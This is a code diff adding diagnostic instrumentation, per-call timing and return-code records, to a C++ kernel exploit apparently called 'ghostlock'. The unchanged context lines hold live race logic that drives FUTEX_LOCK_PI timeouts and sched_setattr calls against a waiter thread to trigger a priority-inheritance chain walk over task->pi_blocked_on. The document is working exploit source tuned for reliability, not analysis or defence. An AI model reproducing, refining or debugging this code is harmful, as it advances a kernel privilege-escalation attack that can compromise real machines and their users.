@@ -14,6 +14,16 @@
 
 using namespace ghostlock;
 
+namespace {
+    /* LOCAL DIAGNOSTIC (run-18): monotonic microseconds for the consumer's
+     * per-call records (see PiRace::ConsumerCallDiag). vDSO clock, ~25 ns. */
+    int64_t diag_now_us() noexcept {
+        struct timespec ts{};
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        return static_cast<int64_t>(ts.tv_sec) * 1000000 + ts.tv_nsec / 1000;
+    }
+}
+
 namespace ghostlock::race {
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
@@ -112,6 +122,9 @@ namespace ghostlock::race {
                 continue;
             }
             seen = seq;
+            /* LOCAL DIAGNOSTIC (run-18): which sequence the consumer last picked
+             * up -- tells a sleeping/looping consumer from a dead one. */
+            race->consumer_seq_seen.store(seq, std::memory_order_relaxed);
             int32_t tid = race->waiter_tid.load();
             int32_t calls_this_seq = 0;
             while (!race->consumer_stop.load() &&
@@ -131,7 +144,33 @@ namespace ghostlock::race {
                     int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
+                    /* LOCAL DIAGNOSTIC (run-18): open the record before the first
+                     * syscall, so a call that never returns is still visible. */
+                    PiRace::ConsumerCallDiag *diag = nullptr;
+                    if (race->consumer_diag_on.load(std::memory_order_relaxed)) {
+                        auto &record = race->consumer_call_diag[
+                                race->consumer_diag_next.fetch_add(1, std::memory_order_relaxed) %
+                                PiRace::kConsumerDiagSlots];
+                        record.seq.store(seq, std::memory_order_relaxed);
+                        record.index.store(calls_this_seq, std::memory_order_relaxed);
+                        record.nice.store(consumer_nice, std::memory_order_relaxed);
+                        record.sched_ret.store(0, std::memory_order_relaxed);
+                        record.sched_errno.store(0, std::memory_order_relaxed);
+                        record.futex_used.store(0, std::memory_order_relaxed);
+                        record.futex_ret.store(0, std::memory_order_relaxed);
+                        record.futex_errno.store(0, std::memory_order_relaxed);
+                        record.t0_us.store(diag_now_us(), std::memory_order_relaxed);
+                        record.t1_us.store(0, std::memory_order_relaxed);
+                        record.phase.store(1, std::memory_order_relaxed);
+                        record.state.store(1, std::memory_order_release);
+                        diag = &record;
+                    }
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
+                    if (diag) {
+                        diag->sched_ret.store(static_cast<int32_t>(sched_ret),
+                                              std::memory_order_relaxed);
+                        diag->sched_errno.store(errno, std::memory_order_relaxed);
+                    }
                     /* This fallback enters futex_lock_pi, and a timeout there runs
                      * rt_mutex_cleanup_proxy_lock -> rt_mutex_adjust_prio_chain on
                      * this task -- a walk that dereferences task->pi_blocked_on,
@@ -145,9 +184,17 @@ namespace ghostlock::race {
                     if (sched_ret != 0 && !race->consumer_stop.load() &&
                         race->consumer_go.load() == seq) {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
+                        if (diag) diag->phase.store(2, std::memory_order_relaxed);
                         long fret = support::futex_op(
                             &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
+                        if (diag) {
+                            diag->futex_used.store(1, std::memory_order_relaxed);
+                            diag->futex_ret.store(static_cast<int32_t>(fret),
+                                                  std::memory_order_relaxed);
+                            diag->futex_errno.store(errno, std::memory_order_relaxed);
+                        }
                         if (fret == 0) {
+                            if (diag) diag->phase.store(3, std::memory_order_relaxed);
                             support::futex_op(
                                 &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                             sched_ret = 0;
@@ -155,6 +202,10 @@ namespace ghostlock::race {
                     }
                     if (sched_ret == 0) race->consumer_success.fetch_add(1);
                     race->consumer_inflight.store(0);
+                    if (diag) {
+                        diag->t1_us.store(diag_now_us(), std::memory_order_relaxed);
+                        diag->state.store(2, std::memory_order_release);
+                    }
                     calls_this_seq++;
                     if (static_cast<uint32_t>(calls_this_seq) >=
                         session::g_exploit_session.profile.select_consumer_max_calls()) {
